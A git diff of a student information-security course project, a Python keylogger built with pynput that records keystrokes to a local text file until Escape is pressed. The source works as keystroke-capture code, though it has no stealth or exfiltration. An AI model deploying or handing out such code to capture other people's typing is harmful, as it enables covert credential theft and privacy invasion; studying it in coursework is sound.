@@ -1,45 +1,52 @@
-# -*- coding: utf-8 -*-
-"""
-Created on Sun May  9 15:59:25 2021
+'''
+CSC382: Introduction to Information Security Final Project - Keylogger
 
-@author: 
+Created by:
+    Samuel Davis and Ethan Evans
+
+Adapted from:
     https://youtu.be/TbMKwl11itQ
-"""
+
+'''
 
 from pynput.keyboard import Key, Listener
-print("Online")
 
+print("Recording...")
 count = 0
 keys = []
-
 
 def on_press(key):
     global keys, count
     print('{0} pressed'.format(key))
+
     count += 1
     keys.append(key)
     if count >= 5:
         count = 1
         write_file(keys)
-        key = []
-
+        keys = []
 
 def write_file(keys):
-    with open("5921log.txt", "a") as f:
+    with open("/Users/etevans/Desktop/output.txt", "a") as f:
         for key in keys:
             k = str(key).replace("'", "")
             if k.find("space") > 1:
-                f.write(str(key), "\n")
+                f.write(" ")
+            elif k.find("enter") > 1:
+                f.write("[ENTER]")
+            elif k.find("tab") > 1:
+                f.write("[TAB]")
+            elif k.find("shift") > 1:
+                f.write("[SHIFT]")
             elif k.find("Key") == -1:
                 f.write(k)
 
-
 def on_release(key):
     if key == Key.esc:
-        # Stop listener
         return False
 
+with open("/Users/etevans/Desktop/output.txt", "w") as f:
+    pass
 
-# Collect events until released
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
